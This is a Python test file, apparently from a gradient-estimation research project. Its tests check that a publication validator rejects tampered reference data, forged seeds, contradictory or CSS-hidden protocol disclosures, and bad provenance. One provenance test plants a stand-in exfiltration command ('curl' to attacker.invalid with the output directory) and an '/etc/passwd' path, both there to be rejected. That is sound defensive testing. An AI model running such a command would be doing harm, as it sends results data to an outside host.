        self.assertNotEqual(row["reference_gradient"], row["intervals"]["g_h2"]["mean"])
        write_fixture_json(path, payload)
        _refresh_manifest_and_index(root)
        validate_publication(root)

        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["reference_gradient"] = payload["rows"][0]["intervals"][
            "g_h2"
        ]["mean"]
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "Richardson|richardson"):
            validate_publication(root)

    def test_paired_zero_consistency_is_audit_only(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        dimension = len(row["parameters"])
        row["g_h"] = [
            [value] * dimension
            for value in (
                0.052928194633246696,
                0.059918924803514795,
                0.05693669810562195,
                0.05633518264485265,
            )
        ]
        row["g_h2"] = [
            [value] * dimension
            for value in (
                0.05202573984714303,
                0.057153629941258006,
                0.05285441237882375,
                0.05305384543401927,
            )
        ]
        row["score"] = [
            [value] * dimension
            for value in (
                0.15804882131814685,
                -0.06574415975572863,
                0.004704235406815165,
                0.08671200702965258,
            )
        ]
        _populate_reference_evidence(row)
        self.assertFalse(row["accepted"]["paired_step_consistency"])
        self.assertTrue(row["accepted"]["truncation_error_controlled"])
        self.assertTrue(row["accepted"]["step_consistency"])
        self.assertTrue(row["accepted"]["references"])
        self.assertFalse(
            any("paired" in reason.casefold() for reason in row["reasons"])
        )
        write_fixture_json(path, payload)
        _refresh_manifest_and_index(root)
        validate_publication(root)

    def test_truncation_control_gates_references_when_paired_zero_check_passes(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        dimension = len(row["parameters"])
        error_values = (-1.0, -0.5, 0.5, 1.0)
        refinement_power = (
            REFERENCE_POLICY.refinement_ratio**REFERENCE_POLICY.richardson_order
        )
        row["g_h"] = [
            [2.0 + refinement_power * error] * dimension for error in error_values
        ]
        row["g_h2"] = [[2.0 + error] * dimension for error in error_values]
        row["score"] = [[2.0] * dimension for _ in error_values]
        _populate_reference_evidence(row)
        self.assertTrue(row["accepted"]["paired_step_consistency"])
        self.assertFalse(row["accepted"]["truncation_error_controlled"])
        self.assertFalse(row["accepted"]["step_consistency"])
        self.assertFalse(row["accepted"]["references"])
        row["accepted"]["references"] = True
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "truncation|numerical budget"):
            validate_publication(root)

    def test_tolerated_interval_rounding_cannot_drive_reference_acceptance(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        dimension = len(row["parameters"])
        fine_error = 2.0e-13
        richardson = 1.0
        row["g_h"] = [
            [
                richardson
                + (REFERENCE_POLICY.refinement_ratio**REFERENCE_POLICY.richardson_order)
                * fine_error
            ]
            * dimension
            for _ in range(REFERENCE_POLICY.replicates)
        ]
        row["g_h2"] = [
            [richardson + fine_error] * dimension
            for _ in range(REFERENCE_POLICY.replicates)
        ]
        row["score"] = [
            [richardson] * dimension for _ in range(REFERENCE_POLICY.replicates)
        ]
        _populate_reference_evidence(row)
        self.assertFalse(row["accepted"]["truncation_error_controlled"])

        error_interval = row["intervals"]["fine_truncation_error"]
        error_interval["mean"] = [0.0] * dimension
        error_interval["ci_low"] = [0.0] * dimension
        error_interval["ci_high"] = [0.0] * dimension
        row["diagnostics"]["truncation_upper_bound"] = [0.0] * dimension
        row["diagnostics"]["truncation_components"] = [True] * dimension
        row["accepted"]["references"] = True
        row["accepted"]["step_consistency"] = True
        row["accepted"]["truncation_error_controlled"] = True
        row["reasons"] = []
        write_fixture_json(path, payload)
        _refresh_manifest(root)

        with self.assertRaisesRegex(
            ValidationError, "fine_truncation_error|stored replicates|truncation"
        ):
            validate_publication(root)

    def test_method_metrics_are_bound_to_the_accepted_richardson_reference(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = next(
            item
            for item in payload["rows"]
            if item["cell_id"] == "path_tracer:initial_parameters"
        )
        dimension = len(row["parameters"])
        reference_value = 1.0e-15
        row["g_h"] = [
            [reference_value] * dimension for _ in range(REFERENCE_POLICY.replicates)
        ]
        row["g_h2"] = [
            [reference_value] * dimension for _ in range(REFERENCE_POLICY.replicates)
        ]
        row["score"] = [
            [reference_value] * dimension for _ in range(REFERENCE_POLICY.replicates)
        ]
        _populate_reference_evidence(row)
        write_fixture_json(path, payload)
        _refresh_manifest(root)

        with self.assertRaisesRegex(
            ValidationError, "method.*reference|accepted Richardson|reference_gradient"
        ):
            validate_publication(root)

    def test_raw_method_metrics_are_exactly_recomputed_from_richardson(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = next(item for item in payload["rows"] if "gradient" in item)
        row["relative_error"] = 999.0
        row["cosine_similarity"] = -1.0
        row["sign_agreement"] = 0.123
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(
            ValidationError,
            "relative_error|cosine_similarity|sign_agreement|reference metrics",
        ):
            validate_publication(root)

    def test_validator_recomputes_method_summaries_and_plot_semantics(self):
        mutations = (
            (
                "summary bias",
                "data/summary.json",
                lambda payload: payload["method_summaries"][0][
                    "empirical_bias"
                ].__setitem__(0, 123.0),
                "summary|aggregate|bias|derived",
            ),
            (
                "gradient plot",
                "data/plot_data/gradient_quality.json",
                lambda payload: payload["rows"][1]["values"].__setitem__(0, 123.0),
                "plot|semantic|gradient|derived",
            ),
            (
                "bias plot",
                "data/plot_data/bias_variance.json",
                lambda payload: payload["rows"][0]["values"].__setitem__(0, 123.0),
                "plot|semantic|bias|derived",
            ),
        )
        for name, relative, mutate, error in mutations:
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                path = root / relative
                payload = json.loads(path.read_text(encoding="utf-8"))
                mutate(payload)
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, error):
                    validate_publication(root)

    def test_reference_seed_streams_and_protocol_metadata_are_canonical(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = next(
            item
            for item in payload["rows"]
            if item["cell_id"] == "path_tracer:initial_parameters"
        )
        self.assertEqual(
            row["seeds"],
            {
                "five_point_outer": [184435890, 184435891, 184435892, 184435893],
                "five_point_inner": [721306802, 721306803, 721306804, 721306805],
                "score_outer": [1258177714, 1258177715, 1258177716, 1258177717],
                "score_inner": [1795048626, 1795048627, 1795048628, 1795048629],
            },
        )
        for stream in row["seeds"].values():
            for index in range(len(stream)):
                stream[index] += 12345
        row["protocol_seed_table"] = {"reference_base": 1}
        row["protocol_seed_inputs"] = {
            "reference_base": 1,
            "reference_inner_base": 2,
        }
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(
            ValidationError, "canonical reference seed|protocol seed|seed provenance"
        ):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        row["protocol_seed_table"] = {"reference_base": 101}
        row["protocol_seed_inputs"] = {
            "reference_base": 101,
            "reference_inner_base": 111,
        }
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(
            ValidationError, "must not contain protocol seed|seed provenance"
        ):
            validate_publication(root)

    def test_reference_schema_rejects_numeric_aliases_and_extra_count_keys(self):
        mutations = (
            (
                "interval scalar",
                lambda row: row["intervals"]["g_h"]["mean"].__setitem__(0, 0),
                "float|interval|type",
            ),
            (
                "interval replicates",
                lambda row: row["intervals"]["g_h"].__setitem__("replicates", 4.0),
                "replicates|integer|interval",
            ),
            (
                "interval degrees of freedom",
                lambda row: row["intervals"]["g_h"].__setitem__(
                    "degrees_of_freedom", 3.0
                ),
                "degrees_of_freedom|integer|interval",
            ),
            (
                "diagnostic scalar",
                lambda row: row["diagnostics"]["truncation_upper_bound"].__setitem__(
                    0, 0
                ),
                "diagnostics|float|type",
            ),
            (
                "count scalar",
                lambda row: row["counts"].__setitem__("samples", 32768.0),
                "counts|samples|integer",
            ),
            (
                "count extra key",
                lambda row: row["counts"].__setitem__("extra", "forged"),
                "counts|canonical keys|schema",
            ),
        )
        for name, mutate, error in mutations:
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                path = root / "data/raw/references.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                mutate(payload["rows"][0])
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, error):
                    validate_publication(root)

    def test_reference_inputs_reject_self_consistent_forged_dimension(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = next(
            item
            for item in payload["rows"]
            if item["cell_id"] == "collision_2d:pinball_bank:start_0"
        )
        dimension = 7
        row["parameters"] = [42.0] * dimension
        row["sigma"] = [0.02] * dimension
        row["h"] = [0.2] * dimension
        row["h_half"] = [0.1] * dimension
        row["g_h"] = [[0.0] * dimension for _ in range(REFERENCE_POLICY.replicates)]
        row["g_h2"] = [[0.0] * dimension for _ in range(REFERENCE_POLICY.replicates)]
        row["score"] = [[0.0] * dimension for _ in range(REFERENCE_POLICY.replicates)]
        samples = row["counts"]["samples"]
        single_stencil = (
            FIVE_POINT_STENCIL_FORWARD_EVALUATIONS_PER_DIMENSION
            * dimension
            * samples
            * REFERENCE_POLICY.replicates
        )
        row["counts"].update(
            h_forward_executions=single_stencil,
            h2_forward_executions=single_stencil,
            five_point_forward_executions=2 * single_stencil,
            forward_executions=2 * single_stencil
            + REFERENCE_POLICY.replicates * samples,
        )
        _populate_reference_evidence(row)
        write_fixture_json(path, payload)
        _refresh_manifest(root)

        with self.assertRaisesRegex(
            ValidationError, "canonical.*input|parameters|dimension"
        ):
            validate_publication(root)

    def test_reference_inputs_reject_same_dimension_tampering(self):
        cases = (
            (
                "parameters",
                lambda row: row["parameters"].__setitem__(0, 42.0),
            ),
            ("sigma", lambda row: row["sigma"].__setitem__(0, 0.03)),
            (
                "realized steps",
                lambda row: (
                    row["h"].__setitem__(0, 0.2),
                    row["h_half"].__setitem__(0, 0.1),
                ),
            ),
        )
        for name, tamper in cases:
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                path = root / "data/raw/references.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                row = next(
                    item
                    for item in payload["rows"]
                    if item["cell_id"] == "collision_2d:pinball_bank:start_0"
                )
                tamper(row)
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(
                    ValidationError, "canonical.*input|parameters|sigma|h"
                ):
                    validate_publication(root)

    def test_protocol_disclosure_is_fail_closed(self):
        omissions = (
            ("95%", "95%"),
            ("componentwise", "componentwise"),
            ("not simultaneous", "not simultaneous"),
            ("E =", "<var>E</var> ="),
            ("R =", "<var>R</var> ="),
            ("largest absolute", "largest absolute"),
            ("one quarter", "one quarter"),
            ("64-ULP", "64-ULP"),
            ("audit-only", "audit-only"),
            ("do not gate publication", "do not gate publication"),
        )
        for name, rendered_phrase in omissions:
            with self.subTest(phrase=name):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                if rendered_phrase not in source:
                    self.fail(f"rendered protocol phrase is missing: {name}")
                mutated = source.replace(rendered_phrase, "", 1)
                if mutated == source:
                    self.fail(f"protocol omission did not mutate HTML: {name}")
                path.write_text(mutated, encoding="utf-8")
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|protocol.*disclos|confidence|audit-only",
                ):
                    validate_publication(root)

    def test_protocol_disclosure_rejects_forged_reference_formulas(self):
        for name, original, forged in (
            (
                "fine truncation",
                "<var>E</var> = (<var>g</var><sub>h</sub> − "
                "<var>g</var><sub>h/2</sub>) ÷ 15",
                "<var>E</var> = 0",
            ),
            (
                "Richardson",
                "<var>R</var> = <var>g</var><sub>h/2</sub> − <var>E</var>",
                "<var>R</var> = 0",
            ),
        ):
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                if original not in source:
                    self.fail(f"rendered formula is missing: {name}")
                mutated = source.replace(original, forged, 1)
                if mutated == source:
                    self.fail(f"formula mutation did not change HTML: {name}")
                path.write_text(
                    mutated,
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|formula|truncation|Richardson|disclosure",
                ):
                    validate_publication(root)

    def test_protocol_disclosure_rejects_disconnected_semantic_tokens(self):
        cases = (
            (
                "confidence",
                "Reference intervals use 95% confidence. The scope is componentwise. "
                "These intervals are not simultaneous.",
            ),
            (
                "budget",
                "Publication requires Richardson-score interval overlap. The largest "
                "absolute E interval endpoint is reported. One quarter of the Richardson "
                "half-width is recorded. A 64-ULP binary64 numerical floor is recorded.",
            ),
            (
                "overlap and budget",
                "Richardson-score interval overlap is reported. Publication bounds the "
                "largest absolute E interval endpoint by the larger of one quarter of the "
                "Richardson half-width and a 64-ULP binary64 numerical floor.",
            ),
        )
        for name, forged in cases:
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                path.write_text(
                    _replace_protocol_disclosure_paragraph(source, f"<p>{forged}</p>"),
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|confidence|overlap|budget|disclosure",
                ):
                    validate_publication(root)

    def test_protocol_disclosure_binds_each_audit_only_diagnostic(self):
        canonical_audit = (
            "Marginal step comparisons remain audit-only diagnostics and do not gate "
            "publication. Paired-zero step comparisons remain audit-only diagnostics "
            "and do not gate publication."
        )
        cases = (
            (
                "generic",
                "Diagnostics are audit-only and do not gate publication. Marginal and "
                "paired-zero step comparisons are recorded.",
            ),
            (
                "marginal only",
                "Marginal step comparisons are audit-only diagnostics and do not gate "
                "publication. Paired-zero step comparisons are recorded.",
            ),
            (
                "paired only",
                "Paired-zero step comparisons are audit-only diagnostics and do not gate "
                "publication. Marginal step comparisons are recorded.",
            ),
        )
        for name, forged in cases:
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                if canonical_audit not in source:
                    self.fail("rendered protocol audit clauses are missing")
                mutated = source.replace(canonical_audit, forged, 1)
                if mutated == source:
                    self.fail(f"audit-clause mutation did not change HTML: {name}")
                path.write_text(
                    mutated,
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|marginal|paired|audit-only|non-gating",
                ):
                    validate_publication(root)

    def test_protocol_disclosure_rejects_negated_semantics(self):
        cases = (
            (
                "formula",
                "It is false that E = (g_h minus g_h2) divided by 15, while the "
                "fourth-order Richardson reference R = g_h2 minus E.",
            ),
            (
                "confidence",
                "Reference intervals do not use 95% confidence componentwise, not "
                "simultaneous.",
            ),
            (
                "overlap and budget",
                "Publication does not require Richardson-score interval overlap and "
                "does not bound the largest absolute E interval endpoint by the larger "
                "of one quarter of the Richardson half-width and a 64-ULP binary64 "
                "numerical floor.",
            ),
            (
                "marginal audit",
                "Marginal step comparisons are not audit-only diagnostics and do not "
                "gate publication.",
            ),
            (
                "paired audit",
                "Paired-zero step comparisons are not audit-only diagnostics and do not "
                "gate publication.",
            ),
        )
        for name, forged in cases:
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                path.write_text(
                    _replace_protocol_disclosure_paragraph(source, f"<p>{forged}</p>"),
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|formula|confidence|overlap|budget|marginal|paired|audit-only",
                ):
                    validate_publication(root)

    def test_protocol_disclosure_rejects_appended_contradictions(self):
        contradictions = (
            "Reference intervals do not use 95% confidence componentwise, not "
            "simultaneous.",
            "Publication does not require Richardson-score interval overlap and does "
            "not bound the largest absolute E interval endpoint by the larger of one "
            "quarter of the Richardson half-width and a 64-ULP binary64 numerical floor.",
            "Marginal step comparisons are not audit-only diagnostics.",
            "Paired-zero step comparisons are not audit-only diagnostics.",
        )
        for contradiction in contradictions:
            with self.subTest(contradiction=contradiction):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                mutated = _append_before_body(source, f"<p>{contradiction}</p>")
                path.write_text(
                    mutated,
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|contradict|confidence|overlap|budget|marginal|paired|audit-only",
                ):
                    validate_publication(root)

    def test_protocol_disclosure_cannot_be_hidden_by_stylesheet_class(self):
        root = make_valid_fixture(self)
        path = root / "index.html"
        source = path.read_text(encoding="utf-8")
        paragraph_start = source.index(PROTOCOL_DISCLOSURE_PARAGRAPH_START)
        paragraph_end = source.index("</p>", paragraph_start) + len("</p>")
        paragraph = source[paragraph_start:paragraph_end]
        concealed = (
            "<style>.concealed-disclosure { display: none; }</style>"
            '<span class="concealed-disclosure">'
            f"{paragraph}"
            "</span>"
            "<p>95% intervals are simultaneous.</p>"
        )
        path.write_text(
            _replace_protocol_disclosure_paragraph(source, concealed),
            encoding="utf-8",
        )

        with self.assertRaisesRegex(
            ValidationError, "stylesheet|style|hidden|conceal|disclosure"
        ):
            validate_publication(root)

    def test_visible_prose_rejects_all_protocol_contradiction_families(self):
        contradictions = (
            "95% intervals are simultaneous.",
            "Overlap is optional.",
            "Budget need not hold.",
            "Marginal consistency may gate publication.",
        )
        for contradiction in contradictions:
            with self.subTest(contradiction=contradiction):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                path.write_text(
                    _append_before_body(source, f"<p>{contradiction}</p>"),
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|contradict|confidence|simultaneous|overlap|budget|marginal|gate",
                ):
                    validate_publication(root)

    def test_protocol_disclosure_cannot_be_concealed_by_visual_css(self):
        hiding_rules = (
            "opacity: 0",
            "font-size: 0",
            "clip-path: inset(100%)",
            "position: absolute; left: -100000px",
        )
        for rule in hiding_rules:
            with self.subTest(rule=rule):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                paragraph_start = source.index(PROTOCOL_DISCLOSURE_PARAGRAPH_START)
                paragraph_end = source.index("</p>", paragraph_start) + len("</p>")
                paragraph = source[paragraph_start:paragraph_end]
                concealed = (
                    f"<style>.concealed-disclosure {{ {rule}; }}</style>"
                    '<span class="concealed-disclosure">'
                    f"{paragraph}"
                    "</span>"
                    "<p>The intervals form a simultaneous 95% confidence region.</p>"
                )
                path.write_text(
                    _replace_protocol_disclosure_paragraph(source, concealed),
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError, "canonical|protocol|disclosure|style"
                ):
                    validate_publication(root)

    def test_canonical_report_rejects_protocol_contradiction_synonyms(self):
        contradictions = (
            "The intervals form a simultaneous 95% confidence region.",
            "Richardson-score interval overlap is not mandatory.",
            "The truncation numerical budget can be ignored.",
            "Marginal consistency sometimes gates publication.",
        )
        for contradiction in contradictions:
            with self.subTest(contradiction=contradiction):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = path.read_text(encoding="utf-8")
                path.write_text(
                    _append_before_body(source, f"<p>{contradiction}</p>"),
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|protocol|disclosure|confidence|overlap|budget|marginal",
                ):
                    validate_publication(root)

    def test_reference_rows_exactly_cover_the_canonical_cells(self):
        root = make_valid_fixture(self)
        references_path = root / "data/raw/references.json"
        references = json.loads(references_path.read_text(encoding="utf-8"))
        extra = copy.deepcopy(references["rows"][0])
        extra["row_id"] = "reference:forged-extra"
        extra["cell_id"] = "aaa_forged:extra"
        extra["truncation_policy"]["roundoff_floor_ulps"] = 999
        extra["accepted"]["references"] = False
        extra["reasons"] = ["synthetic rejected extra row"]
        references["rows"].append(extra)
        write_fixture_json(references_path, references)

        validity_path = root / "data/plot_data/validity.json"
        validity = json.loads(validity_path.read_text(encoding="utf-8"))
        validity["rows"][0]["source_row_ids"].append(extra["row_id"])
        write_fixture_json(validity_path, validity)
        _refresh_manifest(root)

        with self.assertRaisesRegex(
            ValidationError, "reference rows.*canonical|reference.*coverage"
        ):
            validate_publication(root)

    def test_step_consistency_publication_gate_claims_are_rejected(self):
        for diagnostic in ("Marginal", "Paired-zero"):
            with self.subTest(diagnostic=diagnostic):
                root = make_valid_fixture(self)
                path = root / "index.html"
                source = _append_before_body(
                    path.read_text(encoding="utf-8"),
                    f"<p>{diagnostic} consistency is required for publication.</p>",
                )
                path.write_text(source, encoding="utf-8")
                with self.assertRaisesRegex(
                    ValidationError,
                    "canonical|marginal|paired.*audit|paired.*publication|publication gate",
                ):
                    validate_publication(root)

    def test_reference_dimensions_counts_and_crn_seed_streams_are_enforced(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["g_h"][0] = []
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "dimension|g_h"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["counts"]["forward_executions"] += 1
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "forward"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["seeds"]["score_outer"][0] = 100
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "seed"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/manifest.json"
        manifest = json.loads(path.read_text(encoding="utf-8"))
        manifest["reference_required_cells"] = []
        write_fixture_json(path, manifest)
        with self.assertRaisesRegex(ValidationError, "reference_required_cells"):
            validate_publication(root)

    def test_large_finite_canonical_reference_statistics_do_not_overflow(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        dimension = len(row["parameters"])
        large = 1.0e308
        for field in ("g_h", "g_h2", "score"):
            row[field] = [
                [large] * dimension for _ in range(REFERENCE_POLICY.replicates)
            ]
        _populate_reference_evidence(row)
        write_fixture_json(path, payload)
        _refresh_manifest_and_index(root)
        validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        dimension = len(row["parameters"])
        values = [
            7.87073622007493e73,
            7.87073622007494e73,
            7.870736220074919e73,
            7.870736220074938e73,
        ]
        for field in ("g_h", "g_h2", "score"):
            row[field] = [[value] * dimension for value in values]
        _populate_reference_evidence(row)
        write_fixture_json(path, payload)
        _refresh_manifest_and_index(root)
        validate_publication(root)

    def test_extreme_scale_reference_metric_raises_validation_error(self):
        with self.assertRaisesRegex(
            ValidationError, "reference-relative reference norm is unrepresentable"
        ):
            validate_report_module.compute_reference_metrics([1.0e308], [5e-324])

    def test_rejected_rows_cannot_feed_summary_or_headline_aggregates(self):
        root = make_valid_fixture(self)
        raw_path = root / "data/raw/triangle_2d.json"
        raw = json.loads(raw_path.read_text(encoding="utf-8"))
        raw["rows"][0]["accepted"] = False
        write_fixture_json(raw_path, raw)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        summary["method_summaries"][0]["source_row_ids"] = ["triangle:0"]
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "rejected"):
            validate_publication(root)

        root = make_valid_fixture(self)
        summary_path = root / "data/summary.json"
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
        summary["headline_metrics"] = {
            "best": {"value": 1.0, "source_row_ids": ["missing"]}
        }
        write_fixture_json(summary_path, summary)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "missing|unknown"):
            validate_publication(root)

    def test_duplicate_or_orphaned_lineage_and_empty_summaries_are_rejected(self):
        root = make_valid_fixture(self)
        path = root / "data/plot_data/gradient_quality.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["source_row_ids"].append(
            payload["rows"][0]["source_row_ids"][0]
        )
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "duplicate"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/triangle_2d.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"].append(
            {"row_id": "triangle:orphan", "scenario_family": "triangle_2d"}
        )
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "orphan|lineage"):
            validate_publication(root)

        for collection in (
            "headline_metrics",
            "method_summaries",
            "optimization_summaries",
            "performance_summaries",
            "scenario_validity",
        ):
            with self.subTest(collection=collection):
                root = make_valid_fixture(self)
                path = root / "data/summary.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                payload[collection] = {}
                if collection != "headline_metrics":
                    payload[collection] = []
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, collection):
                    validate_publication(root)

    def test_nonfinite_json_and_missing_literature_are_rejected(self):
        root = make_valid_fixture(self)
        path = root / "data/summary.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["headline_metrics"]["path_best_held_out_loss"]["value"] = math.nan
        path.write_text(json.dumps(payload, sort_keys=True), encoding="utf-8")
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "non-finite"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/summary.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["literature_urls"].remove("https://arxiv.org/abs/2109.05143")
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "2109.05143"):
            validate_publication(root)

    def test_canonical_producer_commit_and_absolute_path_provenance_are_enforced(self):
        root = make_valid_fixture(self)
        manifest_path = root / "data/manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["source"]["command"] = [
            "curl",
            "https://attacker.invalid",
            "$OUTPUT_DIR",
        ]
        write_fixture_json(manifest_path, manifest)
        with self.assertRaisesRegex(ValidationError, "canonical|producer"):
            validate_publication(root)

        for leaked in ("/etc/passwd", "C:/private/results"):
            with self.subTest(leaked=leaked):
                root = make_valid_fixture(self)
                manifest = json.loads(
                    (root / "data/manifest.json").read_text(encoding="utf-8")
                )
                manifest["source"]["platform"] = leaked
                write_fixture_json(root / "data/manifest.json", manifest)
                with self.assertRaisesRegex(ValidationError, "local filesystem"):
                    validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/analytic.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        del payload["rows"][0]["source_commit"]
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "source_commit"):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest = json.loads((root / "data/manifest.json").read_text(encoding="utf-8"))
        manifest["source"]["seeds"] = {"estimator": [-1]}
        write_fixture_json(root / "data/manifest.json", manifest)
        with self.assertRaisesRegex(ValidationError, "seed"):
            validate_publication(root)

    def test_scenario_families_must_have_raw_evidence(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/triangle_2d.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"] = []
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "triangle_2d"):
            validate_publication(root)

    def test_oversized_json_numbers_fail_with_validation_error(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["gradient"] = [10**4000]
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "finite"):
            validate_publication(root)


class ReportBuilderTests(unittest.TestCase):
    @staticmethod
    def _builder():
        from discograd import build_report

        return build_report

    def test_extreme_scale_summary_metric_raises_build_error(self):
        builder = self._builder()

        with self.assertRaisesRegex(
            builder.BuildError,
            "summary reference metrics are invalid: "
            "reference-relative reference norm is unrepresentable",
        ):
            builder._reference_metrics((1.0e308,), (5e-324,))

    def test_builder_rejects_invalid_full_bundle_protocol(self):
        builder = self._builder()

        def mutate_decision(root: Path) -> None:
            path = root / "data/manifest.json"
            payload = json.loads(path.read_text(encoding="utf-8"))
            payload["report_reference_count_decision"]["status"] = "rejected"
            write_fixture_json(path, payload)

        def mutate_runtime(root: Path) -> None:
            path = root / "data/summary.json"
            payload = json.loads(path.read_text(encoding="utf-8"))
            payload["runtime"]["elapsed_measurement"] = "partial_run"
            write_fixture_json(path, payload)
            _refresh_manifest(root)

        def mutate_path_certificate(root: Path) -> None:
            path = root / "data/raw/path_tracer_gradients.json"
            payload = json.loads(path.read_text(encoding="utf-8"))
            protocol = next(
                row
                for row in payload["rows"]
                if row.get("scenario") == "path_randomness_protocol"
            )
            protocol["certificate"]["fully_smoothed"] = True
            write_fixture_json(path, payload)
            _refresh_manifest(root)

        def mutate_contact_validity(root: Path) -> None:
            path = root / "data/raw/contact_3d_optimization.json"
            payload = json.loads(path.read_text(encoding="utf-8"))
            validity = payload["rows"][0]["final_physical_validity"]
            validity["minimum_positive_normal_impulse"] = 0.0
